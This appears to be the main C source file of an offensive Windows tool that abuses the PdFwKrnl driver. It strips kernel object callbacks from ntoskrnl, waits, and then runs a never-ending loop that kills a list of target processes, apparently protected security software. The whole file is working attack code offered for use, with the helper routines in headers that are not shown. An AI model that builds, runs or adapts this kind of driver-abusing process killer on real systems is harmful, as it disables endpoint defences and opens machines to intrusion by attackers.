#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <stdio.h>
#include "PdFwKrnl.h"
#include "TerminateProcess.h"
#include "Callbacks.h"

// -----------------------
// Entry Point
// -----------------------

INT wmain(VOID)
{
    HANDLE    hDev = INVALID_HANDLE_VALUE;
    DWORD     dwIndex = 0;
    HMODULE   hNtosUser = NULL;
    NTOS_INFO ntosInfo = { 0 };

    printf("=== PdFwKrnl PPL Remover & Process Killer ===\n\n");

    printf("[*] Target process list:\n");
    for (dwIndex = 0; dwIndex < g_TargetProcessCount; dwIndex++)
        printf("    [%lu] %ls\n", dwIndex, g_TargetProcessNames[dwIndex]);
    printf("\n");

    hDev = OpenPdFwDevice();
    if (hDev == INVALID_HANDLE_VALUE)
        return 1;

    printf("[+] PdFwKrnl device opened\n\n");

    // Load ntoskrnl once; used by RemoveObCallbacks on every detection.
    if (!GetNtoskrnlInfo(&ntosInfo))
    {
        printf("[!] GetNtoskrnlInfo failed - ObCallback removal will be skipped\n\n");
    }
    else
    {
        printf("[*] ntoskrnl base : 0x%016I64X\n", (ULONG64)ntosInfo.uBase);
        printf("[*] ntoskrnl size : 0x%016I64X\n", (ULONG64)ntosInfo.uSize);
        printf("[*] ntoskrnl path : %ls\n\n", ntosInfo.wszPath);

        hNtosUser = LoadLibraryExW(ntosInfo.wszPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
        if (!hNtosUser)
            printf("[!] LoadLibraryExW(%ls) failed: 0x%08lX - ObCallback removal will be skipped\n\n",
                ntosInfo.wszPath, GetLastError());
    }

    // Step 1: remove ObRegisterCallbacks on Process/Thread object types
    if (hNtosUser)
    {
        printf("[*] Removing ObRegisterCallbacks...\n");
        RemoveObCallbacks(hDev, hNtosUser, &ntosInfo);
        printf("\n");
    }

    // Step 2: wait for the target's kernel callbacks to become inactive
    printf("[*] Waiting 10 seconds...\n\n");
    Sleep(10000);

    // Step 3: MonitorAndKillLoop never returns; Ctrl+C to exit
    MonitorAndKillLoop(hDev);

    return 0;
}
